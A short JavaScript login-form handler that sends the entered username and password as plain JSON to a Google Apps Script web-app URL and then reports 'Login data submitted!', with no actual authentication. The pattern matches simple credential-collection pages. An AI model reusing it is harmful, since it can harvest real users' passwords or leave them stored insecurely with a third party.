document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();

  fetch("https://script.google.com/macros/s/AKfycbzTYFPpKysLtLlX1gKQqd2R_TcamJu6Sxmrqth4S3kydlFxTR8TPQV1gjKEdeXJzTtL/exec", {
    method: "POST",
    body: JSON.stringify({ username: username, password: password }),
    headers: {
      "Content-Type": "application/json",
    },
  })
    .then((res) => res.text())
    .then((data) => {
      alert("Login data submitted!");
      document.getElementById("loginForm").reset();
    })
    .catch((err) => {
      alert("Error occurred: " + err.message);
    });
});
